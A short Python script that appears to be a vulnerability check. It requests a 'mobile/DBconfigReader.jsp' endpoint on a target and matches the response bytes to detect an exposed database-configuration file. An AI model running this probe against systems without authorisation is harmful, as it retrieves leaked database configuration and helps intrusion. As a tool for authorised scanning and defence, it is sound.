import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8080"}

headers = {
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'
}

def scan(target_url):
	target_url=target_url+'mobile/DBconfigReader.jsp'
	try:
		res = requests.get(url=target_url, headers=headers, timeout=10, verify=False,proxies=proxies)
	except:
		res=requests.get(url=target_url, headers=headers, timeout=10, verify=False)
	if str(res.content).startswith("b'\\r\\n\\r\\n\\r\\n") and "\\r\\n\\r\\n\\x" in str(res.content):
		return True
	else:
		return False

		
